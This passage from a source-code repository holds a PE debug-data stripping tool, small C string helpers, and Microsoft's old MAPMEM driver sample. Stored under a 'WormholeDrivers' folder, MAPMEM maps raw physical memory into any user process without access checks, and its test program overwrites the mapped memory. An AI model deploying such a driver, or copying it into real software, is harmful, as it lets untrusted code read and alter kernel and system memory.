                cuiPrintTextA("Setting DebugDirectory.Size to zero", TRUE);
                oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size = 0;
            }
        }

        SectionHeader = ImageRvaToSection(NtHeaders, ImageBase, DebugDirRva);
        if (SectionHeader) {
            Offset = DebugDirRva - ((ULONG)(SectionHeader->VirtualAddress - SectionHeader->PointerToRawData));
            cEntries = DebugDirSize / sizeof(IMAGE_DEBUG_DIRECTORY);
            DebugDirectory = (IMAGE_DEBUG_DIRECTORY *)((ULONG_PTR)ImageBase + Offset);
            if (DebugDirectory) {
                for (i = 1; i <= cEntries; i++) {
                    if (DebugDirectory->Type == IMAGE_DEBUG_TYPE_POGO) {
                        pDebugInfo = (LPBYTE)((ULONG_PTR)ImageBase + DebugDirectory->PointerToRawData);
                        if (pDebugInfo) {
                            RtlSecureZeroMemory(pDebugInfo, DebugDirectory->SizeOfData);
                            cuiPrintTextA("Zeroing debug data", TRUE);
                        }
                    }
                    DebugDirectory++;
                    if (DebugDirectory->SizeOfData == 0)
                        continue;
                }
            }
            else {
                cuiPrintTextA("DebugDirectory address invalid", TRUE);
            }
        }
        else {
            cuiPrintTextA("SectionHeader address invalid", TRUE);
        }

        NewCheckSum = 0;
        CheckSumMappedFile(ImageBase, FileSize, &CurrentCheckSum, &NewCheckSum);
        if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            oh64->CheckSum = NewCheckSum;
        }
        else {
            oh32->CheckSum = NewCheckSum;
        }
    }
    __finally {
        if (ImageBase) {
            FlushViewOfFile(ImageBase, 0);
            UnmapViewOfFile(ImageBase);
        }

        if (hFileMap)
            CloseHandle(hFileMap);

        if (hFile != INVALID_HANDLE_VALUE)
            CloseHandle(hFile);
    }
}

void main()
{
    ULONG l;
    CHAR szFileName[MAX_PATH + 1];

    __security_init_cookie();

    cuiInitialize(FALSE, NULL);

    l = 0;
    RtlSecureZeroMemory(szFileName, sizeof(szFileName));
    GetCommandLineParamA(GetCommandLineA(), 1, szFileName, MAX_PATH, &l);
    if (l > 0) {
        cuiPrintTextA("Processing input file", TRUE);
        cuiPrintTextA(szFileName, TRUE);
        ProcessFile(szFileName);
    }

    ExitProcess(0);
}

```

`source/StripDebug/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`source/StripDebug/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`source/StripDebug/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

size_t _strlen_w(const wchar_t *s)
{
	wchar_t *s0 = (wchar_t *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

```

`source/StripDebug/minirtl/cmdline.c`:

```c
#include <windows.h>

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (ParamLen != NULL)
		*ParamLen = 0;

	if (CmdLine == NULL) {
		if ((Buffer != NULL) && (BufferSize > 0))
			*Buffer = 0;
		return FALSE;
	}

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	)
{
	ULONG	c, plen = 0;
	TCHAR	divider;

	if (CmdLine == NULL)
		return FALSE;

	if (ParamLen != NULL)
		*ParamLen = 0;

	for (c = 0; c <= ParamIndex; c++) {
		plen = 0;

		while (*CmdLine == ' ')
			CmdLine++;

		switch (*CmdLine) {
		case 0:
			goto zero_term_exit;

		case '"':
			CmdLine++;
			divider = '"';
			break;

		default:
			divider = ' ';
		}

		while ((*CmdLine != '"') && (*CmdLine != divider) && (*CmdLine != 0)) {
			plen++;
			if (c == ParamIndex)
				if ((plen < BufferSize) && (Buffer != NULL)) {
					*Buffer = *CmdLine;
					Buffer++;
				}
			CmdLine++;
		}

		if (*CmdLine != 0)
			CmdLine++;
	}

zero_term_exit:

	if ((Buffer != NULL) && (BufferSize > 0))
		*Buffer = 0;

	if (ParamLen != NULL)
		*ParamLen = plen;

	if (plen < BufferSize)
		return TRUE;
	else
		return FALSE;
}

char *ExtractFilePathA(const char *FileName, char *FilePath)
{
	char *p = (char *)FileName, *p0 = (char *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (char *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath)
{
	wchar_t *p = (wchar_t *)FileName, *p0 = (wchar_t *)FileName;

	if ((FileName == 0) || (FilePath == 0))
		return 0;

	while (*FileName != 0) {
		if (*FileName == '\\')
			p = (wchar_t *)FileName + 1;
		FileName++;
	}

	while (p0 < p) {
		*FilePath = *p0;
		FilePath++;
		p0++;
	}

	*FilePath = 0;

	return FilePath;
}

```

`source/StripDebug/minirtl/cmdline.h`:

```h
#ifndef _CMDLINEH_
#define _CMDLINEH_

BOOL GetCommandLineParamW(
	IN	LPCWSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPWSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

BOOL GetCommandLineParamA(
	IN	LPCSTR	CmdLine,
	IN	ULONG	ParamIndex,
	OUT	LPSTR	Buffer,
	IN	ULONG	BufferSize,
	OUT	PULONG	ParamLen
	);

char *ExtractFilePathA(const char *FileName, char *FilePath);
wchar_t *ExtractFilePathW(const wchar_t *FileName, wchar_t *FilePath);

#ifdef UNICODE

#define ExtractFilePath			ExtractFilePathW
#define GetCommandLineParam		GetCommandLineParamW

#else // ANSI

#define ExtractFilePath			ExtractFilePathA
#define GetCommandLineParam		GetCommandLineParamA

#endif

#endif /* _CMDLINEH_ */

```

`source/StripDebug/minirtl/minirtl.h`:

```h
/*
Module name:
	minirtl.h

Description:
	header for string handling and conversion routines

Date:
	1 Mar 2015
*/

#ifndef _MINIRTL_
#define _MINIRTL_

// string copy/concat/length

char *_strend_a(const char *s);
wchar_t *_strend_w(const wchar_t *s);

char *_strcpy_a(char *dest, const char *src);
wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src);

char *_strcat_a(char *dest, const char *src);
wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src);

char *_strncpy_a(char *dest, size_t ccdest, const char *src, size_t ccsrc);
wchar_t *_strncpy_w(wchar_t *dest, size_t ccdest, const wchar_t *src, size_t ccsrc);

size_t _strlen_a(const char *s);
size_t _strlen_w(const wchar_t *s);

// comparing

int _strcmp_a(const char *s1, const char *s2);
int _strcmp_w(const wchar_t *s1, const wchar_t *s2);

int _strncmp_a(const char *s1, const char *s2, size_t cchars);
int _strncmp_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

int _strcmpi_a(const char *s1, const char *s2);
int _strcmpi_w(const wchar_t *s1, const wchar_t *s2);

int _strncmpi_a(const char *s1, const char *s2, size_t cchars);
int _strncmpi_w(const wchar_t *s1, const wchar_t *s2, size_t cchars);

char *_strstr_a(const char *s, const char *sub_s);
wchar_t *_strstr_w(const wchar_t *s, const wchar_t *sub_s);

char *_strstri_a(const char *s, const char *sub_s);
wchar_t *_strstri_w(const wchar_t *s, const wchar_t *sub_s);

// conversion of integer types to string, returning string length

size_t ultostr_a(unsigned long x, char *s);
size_t ultostr_w(unsigned long x, wchar_t *s);

size_t ultohex_a(unsigned long x, char *s);
size_t ultohex_w(unsigned long x, wchar_t *s);

size_t itostr_a(int x, char *s);
size_t itostr_w(int x, wchar_t *s);

size_t i64tostr_a(signed long long x, char *s);
size_t i64tostr_w(signed long long x, wchar_t *s);

size_t u64tostr_a(unsigned long long x, char *s);
size_t u64tostr_w(unsigned long long x, wchar_t *s);

size_t u64tohex_a(unsigned long long x, char *s);
size_t u64tohex_w(unsigned long long x, wchar_t *s);

// string to integers conversion

unsigned long strtoul_a(char *s);
unsigned long strtoul_w(wchar_t *s);

unsigned long long strtou64_a(char *s);
unsigned long long strtou64_w(wchar_t *s);

unsigned long hextoul_a(char *s);
unsigned long hextoul_w(wchar_t *s);

int strtoi_a(char *s);
int strtoi_w(wchar_t *s);

signed long long strtoi64_a(char *s);
signed long long strtoi64_w(wchar_t *s);

unsigned long long hextou64_a(char *s);
unsigned long long hextou64_w(wchar_t *s);

/* =================================== */

#ifdef UNICODE

#define _strend _strend_w
#define _strcpy _strcpy_w
#define _strcat _strcat_w
#define _strlen _strlen_w
#define _strncpy _strncpy_w

#define _strcmp _strcmp_w
#define _strncmp _strncmp_w
#define _strcmpi _strcmpi_w
#define _strncmpi _strncmpi_w
#define _strstr _strstr_w
#define _strstri _strstri_w

#define ultostr ultostr_w
#define ultohex ultohex_w
#define itostr itostr_w
#define i64tostr i64tostr_w
#define u64tostr u64tostr_w
#define u64tohex u64tohex_w

#define strtoul strtoul_w
#define hextoul hextoul_w
#define strtoi strtoi_w
#define strtoi64 strtoi64_w
#define strtou64 strtou64_w
#define hextou64 hextou64_w

#else // ANSI

#define _strend _strend_a
#define _strcpy _strcpy_a
#define _strcat _strcat_a
#define _strlen _strlen_a
#define _strncpy _strncpy_a
#define _strcmp _strcmp_a

#define _strcmp _strcmp_a
#define _strncmp _strncmp_a
#define _strcmpi _strcmpi_a
#define _strncmpi _strncmpi_a
#define _strstr _strstr_a
#define _strstri _strstri_a

#define ultostr ultostr_a
#define ultohex ultohex_a
#define itostr itostr_a
#define i64tostr i64tostr_a
#define u64tostr u64tostr_a
#define u64tohex u64tohex_a

#define strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`source/StripDebug/minirtl/rtltypes.h`:

```h
#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`source/WormholeDrivers/MAPMEM/DIRS`:

```
DIRS=exe     \
     sys

```

`source/WormholeDrivers/MAPMEM/EXE/MAKEFILE`:

```
#
# DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source
# file to this component.  This file merely indirects to the real make file
# that is shared by all the driver components of the Windows NT DDK
#

!INCLUDE $(NTMAKEENV)\makefile.def

```

`source/WormholeDrivers/MAPMEM/EXE/MAPTEST.C`:

```C
/*++

Copyright (c) 1993  Microsoft Corporation

Module Name:

    maptest.h

Abstract:

    Win32 test app for the MAPMEM driver

Environment:

    User mode

Notes:


Revision History:

--*/


#include "windows.h"
#include "winioctl.h"
#include "stdio.h"
#include "stdlib.h"
#include "ioaccess.h"


//
// A couple of typedefs mapmem.h depends on from  MINIPORT.H & NTDDK.H.
//

typedef enum _INTERFACE_TYPE
{
    Internal,
    Isa,
    Eisa,
    MicroChannel,
    TurboChannel,
    MaximumInterfaceType
} INTERFACE_TYPE, *PINTERFACE_TYPE;

typedef LARGE_INTEGER PHYSICAL_ADDRESS;

#include "mapmem.h"



int
__cdecl
main(
    IN int  argc,
    IN char *argv[])
/*++

Routine Description:

    Tries to open the MAPMEM driver & send it a couple of IOCTLs.

Arguments:

    argc - count of command line arguments

    argv - command line arguments

Return Value:


--*/
{
    HANDLE               hDriver;
    PHYSICAL_MEMORY_INFO pmi;
    PVOID                pPartyMem;
    DWORD                cbReturned;
    ULONG                length;
    char                 *aInterfaceType[] =  {"Internal",
                                               "Isa",
                                               "Eisa",
                                               "MicroChannel",
                                               "TurboChannel" };
    if (argc < 4)
    {
        //
        // Display usage message
        //

        printf ("\nUsage: maptest <InterfaceType> <BusNumber> <BusAddress> <AddressSpace> <length>\n\n");
        printf ("\t<InterfaceType>: 1 = Isa, 2 = Eisa, 3 = Microchannel, 4 = TurboChannel\n");
        printf ("\t<BusNumber>    : bus number, i.e. 0 for standard x86 ISA systems\n");
        printf ("\t<BusAddress>   : physical address to map (hex)\n");
        printf ("\t<AddressSpace> : 0 = memory, 1 = I/O\n");
        printf ("\t<length>       : length of section to map (hex)\n\n");

        printf ("\tExample: 'maptest 1 0 0xa0000 0 0x2000'\n");
        return 0;
    }



    //
    // Parse the args
    //

    pmi.InterfaceType       = (INTERFACE_TYPE) atoi (argv[1]);
    pmi.BusNumber           = (ULONG)          atoi (argv[2]);
    pmi.BusAddress.HighPart = (LONG)           0x00000000;
    pmi.AddressSpace        = (LONG)           atoi (argv[4]);

    sscanf (argv[3], "%x", &pmi.BusAddress.LowPart);
    sscanf (argv[5], "%x", &pmi.Length);

    printf ("\tInterfaceType = %s\n",   aInterfaceType[pmi.InterfaceType]);
    printf ("\tBusNumber     = %d\n",   pmi.BusNumber);
    printf ("\tBusAddress    = 0x%x\n", pmi.BusAddress.LowPart, pmi.BusAddress.LowPart);
    printf ("\tAddressSpace  = %d\n",   pmi.AddressSpace);
    printf ("\tLength        = 0x%x\n", pmi.Length, pmi.Length);

    length = pmi.Length;



    //
    // Try to open the device
    //

    if ((hDriver = CreateFile("\\\\.\\MAPMEM",
                              GENERIC_READ | GENERIC_WRITE,
                              0,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL
                              )) != ((HANDLE)-1))

        printf ("\nRetrieved valid handle for MAPMEM driver\n");


    else
    {
        printf ("Can't get a handle to MAPMEM driver\n");

        return 0;
    }



    //
    // Try to map the memory
    //

    if (DeviceIoControl (hDriver,
                         (DWORD) IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY,
                         &pmi,
                         sizeof(PHYSICAL_MEMORY_INFO),
                         &pPartyMem,
                         sizeof(PVOID),
                         &cbReturned,
                         0
                         ) )
    {
        ULONG j;

        //
        // party on memory...
        //

        if (pPartyMem)
        {
            UCHAR uc;

            for (j = 0; j < length; j++)
            {
                uc = READ_REGISTER_UCHAR( (PUCHAR)pPartyMem + j );
                WRITE_REGISTER_UCHAR( (PUCHAR)pPartyMem + j , 0x47 );
            }


            //
            // Unmap the memory
            //

            DeviceIoControl (hDriver,
                             (DWORD) IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY,
                             &pPartyMem,
                             sizeof(PVOID),
                             NULL,
                             0,
                             &cbReturned,
                             0
                             );
        }

        else

            printf ("pPartyMem = NULL\n");
    }

    else

        //
        // We failed to map, possibly due to resource conflicts (i.e
        // some other driver/device already grabbed the section we
        // wanted).
        //

        printf ("DeviceIoControl failed\n");


    CloseHandle(hDriver);

    return 1;
}

```

`source/WormholeDrivers/MAPMEM/EXE/MAPTEST.MAK`:

```MAK
# Nmake macros for building Windows 32-Bit apps

!include <ntwin32.mak>

all: maptest.exe

maptest.obj: maptest.c
    $(cc) $(cflags) $(cvars) $(cdebug) -I..\sys maptest.c

maptest.exe: maptest.obj
    $(link) $(linkdebug) $(conflags) -out:maptest.exe maptest.obj $(conlibs)

```

`source/WormholeDrivers/MAPMEM/EXE/SOURCES`:

```

TARGETNAME=maptest
TARGETPATH=$(BASEDIR)\lib
TARGETTYPE=PROGRAM

INCLUDES=..\sys;$(BASEDIR)\src\video\inc

SOURCES=maptest.c

UMTYPE=console
UMBASE=0x100000

```

`source/WormholeDrivers/MAPMEM/README.TXT`:

```TXT
Build & Run Instructions:
-------------------------

The MAPMEM sample demonstrates how a kernel-mode device driver
can utilize the Zw*MapViewOfSection APIs to (un)map a physical
address into a user-mode process's address space.


NOTE: Microsoft does not recommend architecting Win32 applications
      such that they read/write directly on physical memory.
      User-mode applications are not considered "trusted" parts
      of the system, and giving hardware access to untrusted
      modules seriously impairs system security.

      We encourage developers who need hardware access to locate
      their hardware I/O code in a device driver, and have their
      Win32 app communicate it's requests to the driver via the
      DeviceIoControl() API.


This sample is composed of two parts, a Windows NT kernel-mode
device driver (MAPMEM) and a Win32 test application (MAPTEST).


The Win32 portion contains a file, MAPTEST.C, which attempts to
obtain a handle to MAPMEM & send it IOCTLs.  The executable is built
using the Windows NT SDK.  First update the environment and path by
running <mstools>\setenv.bat.  Then change to the directory where
you have the C source code and the makefile.  Type "nmake /f maptest.mak"
to compile the Win32 program, MAPTEST.EXE.


The kernel driver portion contains the driver source code, MAPMEM.C
and a text file used to configure your registry so that the driver
can be loaded.  The driver is built using the Windows NT DDK.

To build the driver:


    1. Assuming you have run <sdk_root>\setenv.bat and
       <ddk_root>\setenv.bat, build the driver by typing:

               build -cef

       (If there are any errors have a look at the build.log, build.err,
        and build.wrn files to get an idea of what went wrong.)


    2. Copy the newly built driver, <ddk_root>\lib\*\MAPMEM.SYS to the
       <nt_root>\system32\drivers\ directory, i.e.:

               copy \ntddk\lib\i386\free\mapmem.sys c:\winnt\system32\drivers\


    3. Update the registry by running regini.exe on the mapmem.ini
       file, i.e.:

               regini mapmem.ini

       This adds a MAPMEM driver key under the HKEY_LOCAL_MACHINE\
       SYSTEM\CurrentControlSet\Services tree in the registry. You
       can verify this by starting REGEDIT.EXE and looking in the
       appropriate place.


    4. Reboot.


    5. Type:

               net start mapmem

       ...and then execute MAPTEST.EXE.

```

`source/WormholeDrivers/MAPMEM/SYS/MAKEFILE`:

```
#
# DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source
# file to this component.  This file merely indirects to the real make file
# that is shared by all the driver components of the Windows NT DDK
#

!INCLUDE $(NTMAKEENV)\makefile.def

```

`source/WormholeDrivers/MAPMEM/SYS/MAPMEM.C`:

```C
/*++

Copyright (c) 1993  Microsoft Corporation

Module Name:

    mapmem.c

Abstract:

    A simple driver sample which shows how to map physical memory
    into a user-mode process's adrress space using the
    Zw*MapViewOfSection APIs.

Environment:

    kernel mode only

Notes:

    For the sake of simplicity this sample does not attempt to
    recognize resource conflicts with other drivers/devices. A
    real-world driver would call IoReportResource usage to
    determine whether or not the resource is available, and if
    so, register the resource under it's name.

Revision History:

--*/


#include "ntddk.h"
#include "mapmem.h"
#include "stdarg.h"



NTSTATUS
MapMemDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    );

VOID
MapMemUnload(
    IN PDRIVER_OBJECT DriverObject
    );

NTSTATUS
MapMemMapTheMemory(
    IN PDEVICE_OBJECT DeviceObject,
    IN OUT PVOID      ioBuffer,
    IN ULONG          inputBufferLength,
    IN ULONG          outputBufferLength
    );



#if DBG
#define MapMemKdPrint(arg) DbgPrint arg
#else
#define MapMemKdPrint(arg)
#endif



NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING RegistryPath
    )
/*++

Routine Description:

    Installable driver initialization entry point.
    This entry point is called directly by the I/O system.

Arguments:

    DriverObject - pointer to the driver object

    RegistryPath - pointer to a unicode string representing the path
                   to driver-specific key in the registry

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise

--*/
{

    PDEVICE_OBJECT deviceObject = NULL;
    NTSTATUS       ntStatus;
    WCHAR          deviceNameBuffer[] = L"\\Device\\MapMem";
    UNICODE_STRING deviceNameUnicodeString;
    WCHAR          deviceLinkBuffer[] = L"\\DosDevices\\MAPMEM";
    UNICODE_STRING deviceLinkUnicodeString;



    MapMemKdPrint (("MAPMEM.SYS: entering DriverEntry\n"));


    //
    // Create an EXCLUSIVE device object (only 1 thread at a time
    // can make requests to this device)
    //

    RtlInitUnicodeString (&deviceNameUnicodeString,
                          deviceNameBuffer);

    ntStatus = IoCreateDevice (DriverObject,
                               0,
                               &deviceNameUnicodeString,
                               FILE_DEVICE_MAPMEM,
                               0,
                               TRUE,
                               &deviceObject
                               );

    if (NT_SUCCESS(ntStatus))
    {
        //
        // Create dispatch points for device control, create, close.
        //

        DriverObject->MajorFunction[IRP_MJ_CREATE]         =
        DriverObject->MajorFunction[IRP_MJ_CLOSE]          =
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MapMemDispatch;
        DriverObject->DriverUnload                         = MapMemUnload;



        //
        // Create a symbolic link, e.g. a name that a Win32 app can specify
        // to open the device
        //

        RtlInitUnicodeString(&deviceLinkUnicodeString,
                             deviceLinkBuffer);

        ntStatus = IoCreateSymbolicLink (&deviceLinkUnicodeString,
                                         &deviceNameUnicodeString);

        if (!NT_SUCCESS(ntStatus))
        {
            //
            // Symbolic link creation failed- note this & then delete the
            // device object (it's useless if a Win32 app can't get at it).
            //

            MapMemKdPrint (("MAPMEM.SYS: IoCreateSymbolicLink failed\n"));

            IoDeleteDevice (deviceObject);
        }
    }
    else
    {
        MapMemKdPrint (("MAPMEM.SYS: IoCreateDevice failed\n"));
    }

    return ntStatus;
}



NTSTATUS
MapMemDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
/*++

Routine Description:

    Process the IRPs sent to this device.

Arguments:

    DeviceObject - pointer to a device object

    Irp          - pointer to an I/O Request Packet

Return Value:


--*/
{
    PIO_STACK_LOCATION irpStack;
    PVOID              ioBuffer;
    ULONG              inputBufferLength;
    ULONG              outputBufferLength;
    ULONG              ioControlCode;
    NTSTATUS           ntStatus;


    //
    // Init to default settings- we only expect 1 type of
    //     IOCTL to roll through here, all others an error.
    //

    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;


    //
    // Get a pointer to the current location in the Irp. This is where
    //     the function codes and parameters are located.
    //

    irpStack = IoGetCurrentIrpStackLocation(Irp);


    //
    // Get the pointer to the input/output buffer and it's length
    //

    ioBuffer           = Irp->AssociatedIrp.SystemBuffer;
    inputBufferLength  = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;


    switch (irpStack->MajorFunction)
    {
    case IRP_MJ_CREATE:

        MapMemKdPrint (("MAPMEM.SYS: IRP_MJ_CREATE\n"));

        break;



    case IRP_MJ_CLOSE:

        MapMemKdPrint (("MAPMEM.SYS: IRP_MJ_CLOSE\n"));

        break;



    case IRP_MJ_DEVICE_CONTROL:

        ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

        switch (ioControlCode)
        {
        case IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY:

            Irp->IoStatus.Status = MapMemMapTheMemory (DeviceObject,
                                                       ioBuffer,
                                                       inputBufferLength,
                                                       outputBufferLength
                                                       );

            if (NT_SUCCESS(Irp->IoStatus.Status))
            {
                //
                // Success! Set the following to sizeof(PVOID) to
                //     indicate we're passing valid data back.
                //

                Irp->IoStatus.Information = sizeof(PVOID);

                MapMemKdPrint (("MAPMEM.SYS: memory successfully mapped\n"));
            }

            else
            {
                Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

                MapMemKdPrint (("MAPMEM.SYS: memory map failed :(\n"));
            }

            break;



        case IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY:

            if (inputBufferLength >= sizeof(PVOID))
            {
                Irp->IoStatus.Status = ZwUnmapViewOfSection ((HANDLE) -1,
                                                             *((PVOID *) ioBuffer)
                                                             );

                MapMemKdPrint (("MAPMEM.SYS: memory successfully unmapped\n"));
            }
            else
            {
                Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;

                MapMemKdPrint (("MAPMEM.SYS: ZwUnmapViewOfSection failed\n"));
            }

            break;



        default:

            MapMemKdPrint (("MAPMEM.SYS: unknown IRP_MJ_DEVICE_CONTROL\n"));

            Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;

            break;

        }

        break;
    }


    //
    // DON'T get cute and try to use the status field of
    // the irp in the return status.  That IRP IS GONE as
    // soon as you call IoCompleteRequest.
    //

    ntStatus = Irp->IoStatus.Status;

    IoCompleteRequest(Irp,
                      IO_NO_INCREMENT);


    //
    // We never have pending operation so always return the status code.
    //

    return ntStatus;
}



VOID
MapMemUnload(
    IN PDRIVER_OBJECT DriverObject
    )
/*++

Routine Description:

    Just delete the associated device & return.

Arguments:

    DriverObject - pointer to a driver object

Return Value:


--*/
{
    WCHAR                  deviceLinkBuffer[]  = L"\\DosDevices\\MAPMEM";
    UNICODE_STRING         deviceLinkUnicodeString;



    //
    // Free any resources
    //



    //
    // Delete the symbolic link
    //

    RtlInitUnicodeString (&deviceLinkUnicodeString,
                          deviceLinkBuffer
                          );

    IoDeleteSymbolicLink (&deviceLinkUnicodeString);



    //
    // Delete the device object
    //

    MapMemKdPrint (("MAPMEM.SYS: unloading\n"));

    IoDeleteDevice (DriverObject->DeviceObject);
}



NTSTATUS
MapMemMapTheMemory(
    IN PDEVICE_OBJECT DeviceObject,
    IN OUT PVOID      IoBuffer,
    IN ULONG          InputBufferLength,
    IN ULONG          OutputBufferLength
    )
/*++

Routine Description:

    Given a physical address, maps this address into a user mode process's
    address space

Arguments:

    DeviceObject       - pointer to a device object

    IoBuffer           - pointer to the I/O buffer

    InputBufferLength  - input buffer length

    OutputBufferLength - output buffer length

Return Value:

    STATUS_SUCCESS if sucessful, otherwise
    STATUS_UNSUCCESSFUL,
    STATUS_INSUFFICIENT_RESOURCES,
    (other STATUS_* as returned by kernel APIs)

--*/
{

    PPHYSICAL_MEMORY_INFO ppmi = (PPHYSICAL_MEMORY_INFO) IoBuffer;

    INTERFACE_TYPE     interfaceType;
    ULONG              busNumber;
    PHYSICAL_ADDRESS   physicalAddress;
    ULONG              length;
    UNICODE_STRING     physicalMemoryUnicodeString;
    OBJECT_ATTRIBUTES  objectAttributes;
    HANDLE             physicalMemoryHandle  = NULL;
    PVOID              PhysicalMemorySection = NULL;
    ULONG              inIoSpace, inIoSpace2;
    NTSTATUS           ntStatus;
    PHYSICAL_ADDRESS   physicalAddressBase;
    PHYSICAL_ADDRESS   physicalAddressEnd;
    PHYSICAL_ADDRESS   viewBase;
    PHYSICAL_ADDRESS   mappedLength;
    BOOLEAN            translateBaseAddress;
    BOOLEAN            translateEndAddress;
    PVOID              virtualAddress;



    if ( ( InputBufferLength  < sizeof (PHYSICAL_MEMORY_INFO) ) ||
         ( OutputBufferLength < sizeof (PVOID) ) )
    {
       MapMemKdPrint (("MAPMEM.SYS: Insufficient input or output buffer\n"));

       ntStatus = STATUS_INSUFFICIENT_RESOURCES;

       goto done;
    }

    interfaceType          = ppmi->InterfaceType;
    busNumber              = ppmi->BusNumber;
    physicalAddress        = ppmi->BusAddress;
    inIoSpace = inIoSpace2 = ppmi->AddressSpace;
    length                 = ppmi->Length;


    //
    // Get a pointer to physical memory...
    //
    // - Create the name
    // - Initialize the data to find the object
    // - Open a handle to the oject and check the status
    // - Get a pointer to the object
    // - Free the handle
    //

    RtlInitUnicodeString (&physicalMemoryUnicodeString,
                          L"\\Device\\PhysicalMemory");

    InitializeObjectAttributes (&objectAttributes,
                                &physicalMemoryUnicodeString,
                                OBJ_CASE_INSENSITIVE,
                                (HANDLE) NULL,
                                (PSECURITY_DESCRIPTOR) NULL);

    ntStatus = ZwOpenSection (&physicalMemoryHandle,
                              SECTION_ALL_ACCESS,
                              &objectAttributes);

